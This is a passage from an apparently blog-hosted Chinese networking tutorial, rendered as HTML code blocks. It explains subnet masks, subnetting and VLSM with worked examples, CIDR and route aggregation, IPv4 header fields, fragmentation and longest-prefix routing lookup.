class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">子网掩码（Subnet Mask）：<br>用于区分网络部分和主机部分<br><br>格式：<br>二进制：连续的<span class="hljs-number">1</span>后跟连续的<span class="hljs-number">0</span><br>示例：<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">00000000</span><br>十进制：<span class="hljs-number">255.255.255.0</span><br><br>作用：<br>IP地址 &amp; 子网掩码 = 网络地址<br><br>示例：<br>IP地址：    <span class="hljs-number">192.168.1.10</span><br>子网掩码：  <span class="hljs-number">255.255.255.0</span><br>网络地址：  <span class="hljs-number">192.168.1.0</span><br><br>计算过程：<br>  <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000001</span>.<span class="hljs-number">00001010</span>  (<span class="hljs-number">192.168.1.10</span>)<br>&amp; <span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">00000000</span>  (<span class="hljs-number">255.255.255.0</span>)<br>= <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000001</span>.<span class="hljs-number">00000000</span>  (<span class="hljs-number">192.168.1.0</span>)<br></code></pre></td></tr></table></figure><p><strong>常见子网掩码</strong>：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌────────────┬─────────────────┬──────────┬──────────┐<br>│ CIDR表示   │   子网掩码      │ 网络数   │ 主机数   │<br>├────────────┼─────────────────┼──────────┼──────────┤<br>│ /8         │ 255.0.0.0       │   <span class="hljs-number"> 1 </span>    │<span class="hljs-number"> 16777214 </span>│<br>│ /16        │ 255.255.0.0     │   <span class="hljs-number"> 1 </span>    │ <span class="hljs-number"> 65534 </span>  │<br>│ /24        │ 255.255.255.0   │   <span class="hljs-number"> 1 </span>    │  <span class="hljs-number"> 254 </span>   │<br>│ /25        │ 255.255.255.128 │   <span class="hljs-number"> 2 </span>    │  <span class="hljs-number"> 126 </span>   │<br>│ /26        │ 255.255.255.192 │   <span class="hljs-number"> 4 </span>    │   <span class="hljs-number"> 62 </span>   │<br>│ /27        │ 255.255.255.224 │   <span class="hljs-number"> 8 </span>    │   <span class="hljs-number"> 30 </span>   │<br>│ /28        │ 255.255.255.240 │  <span class="hljs-number"> 16 </span>    │   <span class="hljs-number"> 14 </span>   │<br>│ /29        │ 255.255.255.248 │  <span class="hljs-number"> 32 </span>    │    <span class="hljs-number"> 6 </span>   │<br>│ /30        │ 255.255.255.252 │  <span class="hljs-number"> 64 </span>    │    <span class="hljs-number"> 2 </span>   │<br>│ /31        │ 255.255.255.254 │ <span class="hljs-number"> 128 </span>    │    <span class="hljs-number"> 2 </span>   │<br>│ /32        │ 255.255.255.255 │ <span class="hljs-number"> 256 </span>    │    <span class="hljs-number"> 1 </span>   │<br>└────────────┴─────────────────┴──────────┴──────────┘<br><br>主机数 = 2^(32-前缀长度) - 2<br>（减2：网络地址和广播地址）<br></code></pre></td></tr></table></figure><h3 id="2-4-子网划分"><a href="#2-4-子网划分" class="headerlink" title="2.4 子网划分"></a>2.4 子网划分</h3><p><strong>为什么需要子网划分？</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">问题：<br>一个C类网络（192.168.1.0/24）<br>可以容纳254台主机<br>但可能有以下需求：<br><span class="hljs-bullet">- </span>将网络分成多个部门<br><span class="hljs-bullet">- </span>提高安全性<br><span class="hljs-bullet">- </span>减少广播域<br><br>解决方案：<br>子网划分（Subnetting）<br></code></pre></td></tr></table></figure><p><strong>子网划分示例</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs dns">原网络：<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br>子网掩码：<span class="hljs-number">255.255.255.0</span><br>主机数：<span class="hljs-number">254</span><br><br>需求：<br>划分为<span class="hljs-number">4</span>个子网<br>每个子网至少<span class="hljs-number">60</span>台主机<br><br>计算：<br><span class="hljs-number">1</span>. 确定子网数量：<span class="hljs-number">4</span>个子网 → 需要<span class="hljs-number">2</span>位（<span class="hljs-number">2</span>^<span class="hljs-number">2</span> = <span class="hljs-number">4</span>）<br><span class="hljs-number">2</span>. 新的前缀长度：<span class="hljs-number">24</span> + <span class="hljs-number">2</span> = <span class="hljs-number">26</span><br><span class="hljs-number">3</span>. 新的子网掩码：<span class="hljs-number">255.255.255.192</span>（/<span class="hljs-number">26</span>）<br><span class="hljs-number">4</span>. 每个子网主机数：<span class="hljs-number">2</span>^(<span class="hljs-number">32</span>-<span class="hljs-number">26</span>) - <span class="hljs-number">2</span> = <span class="hljs-number">62</span><br><br>子网划分结果：<br>子网<span class="hljs-number">1：192.168.1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">26</span>     (<span class="hljs-number">192.168.1.0</span>   ~ <span class="hljs-number">192.168.1.63</span>)<br>       网络地址：<span class="hljs-number">192.168.1.0</span><br>       广播地址：<span class="hljs-number">192.168.1.63</span><br>       可用范围：<span class="hljs-number">192.168.1.1</span> ~ <span class="hljs-number">192.168.1.62</span><br><br>子网<span class="hljs-number">2：192.168.1</span>.<span class="hljs-number">64</span>/<span class="hljs-number">26</span>    (<span class="hljs-number">192.168.1.64</span>  ~ <span class="hljs-number">192.168.1.127</span>)<br>       网络地址：<span class="hljs-number">192.168.1.64</span><br>       广播地址：<span class="hljs-number">192.168.1.127</span><br>       可用范围：<span class="hljs-number">192.168.1.65</span> ~ <span class="hljs-number">192.168.1.126</span><br><br>子网<span class="hljs-number">3：192.168.1</span>.<span class="hljs-number">128</span>/<span class="hljs-number">26</span>   (<span class="hljs-number">192.168.1.128</span> ~ <span class="hljs-number">192.168.1.191</span>)<br>       网络地址：<span class="hljs-number">192.168.1.128</span><br>       广播地址：<span class="hljs-number">192.168.1.191</span><br>       可用范围：<span class="hljs-number">192.168.1.129</span> ~ <span class="hljs-number">192.168.1.190</span><br><br>子网<span class="hljs-number">4：192.168.1</span>.<span class="hljs-number">192</span>/<span class="hljs-number">26</span>   (<span class="hljs-number">192.168.1.192</span> ~ <span class="hljs-number">192.168.1.255</span>)<br>       网络地址：<span class="hljs-number">192.168.1.192</span><br>       广播地址：<span class="hljs-number">192.168.1.255</span><br>       可用范围：<span class="hljs-number">192.168.1.193</span> ~ <span class="hljs-number">192.168.1.254</span><br></code></pre></td></tr></table></figure><p><strong>VLSM（可变长子网掩码）</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dns">VLSM = Variable Length Subnet Mask<br><br>允许不同子网使用不同长度的子网掩码<br><br>示例：<br>公司网络：<span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br><br>需求：<br>- 部门<span class="hljs-keyword">A</span>：<span class="hljs-number">100</span>台主机<br>- 部门B：<span class="hljs-number">50</span>台主机<br>- 部门C：<span class="hljs-number">25</span>台主机<br>- 点对点链路：<span class="hljs-number">2</span>台设备（路由器之间）<br><br>分配：<br>部门<span class="hljs-keyword">A</span>：<span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">25</span>     (<span class="hljs-number">128</span>个地址，<span class="hljs-number">126</span>个主机)<br>部门B：<span class="hljs-number">192.168.1.128</span>/<span class="hljs-number">26</span>   (<span class="hljs-number">64</span>个地址，<span class="hljs-number">62</span>个主机)<br>部门C：<span class="hljs-number">192.168.1.192</span>/<span class="hljs-number">27</span>   (<span class="hljs-number">32</span>个地址，<span class="hljs-number">30</span>个主机)<br>链路：  <span class="hljs-number">192.168.1.224</span>/<span class="hljs-number">30</span>   (<span class="hljs-number">4</span>个地址，<span class="hljs-number">2</span>个主机)<br><br>优点：<br>✅ 灵活分配<br>✅ 节省地址<br>✅ 高效利用<br></code></pre></td></tr></table></figure><h3 id="2-5-CIDR（无类域间路由）"><a href="#2-5-CIDR（无类域间路由）" class="headerlink" title="2.5 CIDR（无类域间路由）"></a>2.5 CIDR（无类域间路由）</h3><p><strong>什么是CIDR？</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">CIDR = Classless Inter-Domain Routing<br>无类域间路由<br><br>替代传统的A、B、C类地址分类<br>允许任意长度的网络前缀<br><br>表示方法：<br>IP地址/前缀长度<br><br>示例：<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br>- <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span> 是网络地址<br>- /<span class="hljs-number">24</span> 表示前<span class="hljs-number">24</span>位是网络部分<br><br>优点：<br>✅ 灵活分配地址<br>✅ 减少路由表大小（路由聚合）<br>✅ 提高地址利用率<br></code></pre></td></tr></table></figure><p><strong>路由聚合（Route Aggregation）</strong>：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">问题：<br>多个连续的网络<br><br>示例：<br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">192.168.3.0</span>/<span class="hljs-number">24</span><br><br>可以聚合为：<br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">22</span><br><br>计算：<br><span class="hljs-number">192.168.0.0</span>  = <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000000</span>.<span class="hljs-number">00000000</span><br><span class="hljs-number">192.168.3.0</span>  = <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000011</span>.<span class="hljs-number">00000000</span><br>共同前缀：     <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">000000</span>（<span class="hljs-number">22</span>位）<br><br>优点：<br>- 路由表从<span class="hljs-number">4</span>条变成<span class="hljs-number">1</span>条<br>- 减少内存占用<br>- 加快查找速度<br></code></pre></td></tr></table></figure><hr><h2 id="3-IP报文格式"><a href="#3-IP报文格式" class="headerlink" title="3. IP报文格式"></a>3. IP报文格式</h2><h3 id="3-1-IPv4报文头部"><a href="#3-1-IPv4报文头部" class="headerlink" title="3.1 IPv4报文头部"></a>3.1 IPv4报文头部</h3><p><strong>报文结构</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPv4头部（20-60字节）：<br><br><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|Version|  IHL  |Type of Service|          Total Length         |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|         Identification        |Flags|      Fragment Offset    |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|  Time to Live |    Protocol   |         Header Checksum       |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                       Source Address                          |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                    Destination Address                        |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                    Options (if any)                           |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                          Data                                 |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></code></pre></td></tr></table></figure><p><strong>字段说明</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Version（版本，4位）：<br><span class="hljs-bullet">- </span>IP协议版本<br><span class="hljs-bullet">- </span>IPv4 = 4<br><span class="hljs-bullet">- </span>IPv6 = 6<br><br>IHL（头部长度，4位）：<br><span class="hljs-bullet">- </span>Internet Header Length<br><span class="hljs-bullet">- </span>以4字节为单位<br><span class="hljs-bullet">- </span>最小值：5（20字节）<br><span class="hljs-bullet">- </span>最大值：15（60字节）<br><br>Type of Service（服务类型，8位）：<br><span class="hljs-bullet">- </span>现在称为DSCP（差分服务代码点）<br><span class="hljs-bullet">- </span>用于QoS（服务质量）<br><span class="hljs-bullet">- </span>优先级和延迟要求<br><br>Total Length（总长度，16位）：<br><span class="hljs-bullet">- </span>整个IP数据包的长度（头部+数据）<br><span class="hljs-bullet">- </span>单位：字节<br><span class="hljs-bullet">- </span>最大值：65,535字节<br><br>Identification（标识，16位）：<br><span class="hljs-bullet">- </span>唯一标识一个数据包<br><span class="hljs-bullet">- </span>用于分片重组<br><br>Flags（标志，3位）：<br><span class="hljs-bullet">- </span>Bit 0: 保留，必须为0<br><span class="hljs-bullet">- </span>Bit 1: DF（Don&#x27;t Fragment）- 禁止分片<br><span class="hljs-bullet">- </span>Bit 2: MF（More Fragments）- 更多分片<br><br>Fragment Offset（片偏移，13位）：<br><span class="hljs-bullet">- </span>分片在原始数据包中的位置<br><span class="hljs-bullet">- </span>以8字节为单位<br><br>Time to Live（生存时间，8位，TTL）：<br><span class="hljs-bullet">- </span>数据包最大跳数<br><span class="hljs-bullet">- </span>每经过一个路由器减1<br><span class="hljs-bullet">- </span>为0时丢弃<br><span class="hljs-bullet">- </span>防止路由环路<br><br>Protocol（协议，8位）：<br><span class="hljs-bullet">- </span>上层协议类型<br><span class="hljs-bullet">- </span>1 = ICMP<br><span class="hljs-bullet">- </span>6 = TCP<br><span class="hljs-bullet">- </span>17 = UDP<br><br>Header Checksum（头部校验和，16位）：<br><span class="hljs-bullet">- </span>用于检测头部错误<br><span class="hljs-bullet">- </span>只校验头部，不校验数据<br><br>Source Address（源地址，32位）：<br><span class="hljs-bullet">- </span>发送方IP地址<br><br>Destination Address（目的地址，32位）：<br><span class="hljs-bullet">- </span>接收方IP地址<br><br>Options（选项，可变长度）：<br><span class="hljs-bullet">- </span>可选字段<br><span class="hljs-bullet">- </span>用于测试、调试等<br><span class="hljs-bullet">- </span>很少使用<br></code></pre></td></tr></table></figure><h3 id="3-2-IP分片"><a href="#3-2-IP分片" class="headerlink" title="3.2 IP分片"></a>3.2 IP分片</h3><p><strong>为什么需要分片？</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">问题：<br>不同网络的MTU（最大传输单元）不同<br><br>常见MTU：<br><span class="hljs-bullet">- </span>以太网：1500字节<br><span class="hljs-bullet">- </span>PPPoE：1492字节<br><span class="hljs-bullet">- </span>VPN：更小<br><br>如果IP数据包大于MTU：<br>需要分片（Fragmentation）<br></code></pre></td></tr></table></figure><p><strong>分片过程</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">原始数据包：<br>总长度：3000字节<br>MTU：1500字节<br><br>分片1：<br><span class="hljs-bullet">- </span>头部：20字节<br><span class="hljs-bullet">- </span>数据：1480字节<br><span class="hljs-bullet">- </span>标识：12345<br><span class="hljs-bullet">- </span>MF标志：1（还有更多分片）<br><span class="hljs-bullet">- </span>片偏移：0<br><br>分片2：<br><span class="hljs-bullet">- </span>头部：20字节<br><span class="hljs-bullet">- </span>数据：1480字节<br><span class="hljs-bullet">- </span>标识：12345<br><span class="hljs-bullet">- </span>MF标志：1（还有更多分片）<br><span class="hljs-bullet">- </span>片偏移：1480/8 = 185<br><br>分片3：<br><span class="hljs-bullet">- </span>头部：20字节<br><span class="hljs-bullet">- </span>数据：40字节（剩余）<br><span class="hljs-bullet">- </span>标识：12345<br><span class="hljs-bullet">- </span>MF标志：0（最后一个分片）<br><span class="hljs-bullet">- </span>片偏移：2960/8 = 370<br><br>重组：<br>接收方根据标识和片偏移重组<br></code></pre></td></tr></table></figure><p><strong>分片的问题</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">性能问题：<br><span class="hljs-bullet">-</span> 增加处理开销<br><span class="hljs-bullet">-</span> 丢失一个分片，整个数据包需要重传<br><span class="hljs-bullet">-</span> 路由器需要缓存分片<br><br>解决方案：<br><span class="hljs-bullet">1.</span> 路径MTU发现（Path MTU Discovery）<br><span class="hljs-bullet">   -</span> 发送DF标志的数据包<br><span class="hljs-bullet">   -</span> 如果过大，路由器返回ICMP错误<br><span class="hljs-bullet">   -</span> 发送方调整数据包大小<br><br><span class="hljs-bullet">2.</span> TCP MSS协商<br><span class="hljs-bullet">   -</span> 在TCP握手时协商最大段大小<br><span class="hljs-bullet">   -</span> 避免IP层分片<br></code></pre></td></tr></table></figure><hr><h2 id="4-IP路由基础"><a href="#4-IP路由基础" class="headerlink" title="4. IP路由基础"></a>4. IP路由基础</h2><h3 id="4-1-路由的概念"><a href="#4-1-路由的概念" class="headerlink" title="4.1 路由的概念"></a>4.1 路由的概念</h3><p><strong>什么是路由？</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">路由（Routing）：<br>选择数据包传输路径的过程<br><br>生活类比：<br>从北京到上海：<br><span class="hljs-bullet">- </span>可以坐飞机（直达）<br><span class="hljs-bullet">- </span>可以坐高铁（中转）<br><span class="hljs-bullet">- </span>可以自驾（多条路线）<br><br>路由器选择最佳路径<br></code></pre></td></tr></table></figure><p><strong>路由表</strong>：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">路由表（Routing Table）：<br>存储路由信息的表格<br><br>示例：<br>┌─────────────────┬─────────────┬──────────┬──────────┐<br>│ 目的网络        │  子网掩码   │   网关   │   接口   │<br>├─────────────────┼─────────────┼──────────┼──────────┤<br>│ <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>     │ /<span class="hljs-number">24</span>         │ 直连     │  eth0    │<br>│ <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>        │ /<span class="hljs-number">8</span>          │ 直连     │  eth1    │<br>│ <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         │ /<span class="hljs-number">0</span>          │ <span class="hljs-number">192</span>.<span class="hljs-number">168</span>  │  eth0    │<br>│                 │             │ .<span class="hljs-number">1</span>.<span class="hljs-number">1</span>     │          │<br>└─────────────────┴─────────────┴──────────┴──────────┘<br><br><span class="hljs-number">0.0.0.0</span>/<span class="hljs-number">0</span> = 默认路由（Default Route）<br>匹配所有地址<br></code></pre></td></tr></table></figure><h3 id="4-2-路由查找过程"><a href="#4-2-路由查找过程" class="headerlink" title="4.2 路由查找过程"></a>4.2 路由查找过程</h3><p><strong>最长前缀匹配</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dns">目的地址：<span class="hljs-number">192.168.1.10</span><br><br>路由表：<br><span class="hljs-number">1</span>. <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>   → 匹配✅（<span class="hljs-number">24</span>位）<br><span class="hljs-number">2</span>. <span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span>   → 匹配✅（<span class="hljs-number">16</span>位）<br><span class="hljs-number">3</span>. <span class="hljs-number">192.0.0.0</span>/<span class="hljs-number">8</span>      → 匹配✅（<span class="hljs-number">8</span>位）<br><span class="hljs-number">4</span>. <span class="hljs-number">0.0.0.0</span>/<span class="hljs-number">0</span>        → 匹配✅（<span class="hljs-number">0</span>位）<br><br>选择：<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>（最长匹配）<br><br>原则：<br>前缀越长，匹配越精确<br>选择最长匹配的路由<br></code></pre></td></tr></table></figure><p><strong>路由查找算法</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">线性查找：<br><span class="hljs-bullet">- </span>遍历所有路由<br><span class="hljs-bullet">- </span>O(n)复杂度<br><span class="hljs-bullet">- </span>慢<br><br>前缀树（Trie）：<br><span class="hljs-bullet">- </span>二叉树或多叉树<br><span class="hljs-bullet">- </span>O(log n)复杂度<br><span class="hljs-bullet">- </span>快<br><br>路由缓存：<br><span class="hljs-bullet">- </span>缓存最近使用的路由<br><span class="hljs-bullet">- </span>快速查找<br></code></pre></td></tr></table></figure><h3 id="4-3-直接路由vs间接路由"><a href="#4-3-直接路由vs间接路由" class="headerlink" title="4.3 直接路由vs间接路由"></a>4.3 直接路由vs间接路由</h3><p><strong>直接路由（Direct Routing）</strong>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">目的主机在同一网络<br><br>示例：<br>主机<span class="hljs-selector-tag">A</span>：<span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span><br>主机<span class="hljs-selector-tag">B</span>：<span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span><br>同一网络：<span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span><br><br>过程：<br><span class="hljs-number">1</span>. <span class="hljs-selector-tag">A</span>想发送给<span class="hljs-selector-tag">B</span><br><span class="hljs-number">2</span>. 检查：<span class="hljs-selector-tag">B</span>在同一网络<br><span class="hljs-number">3</span>. 直接发送（通过ARP获取<span class="hljs-selector-tag">B</span>的MAC地址）<br><span class="hljs-number">4</span>. 不需要路由器<br></code></pre></td></tr></table></figure><p><strong>间接路由（Indirect Routing）</strong>：</p><figure class="highlight css"><table><tr><td 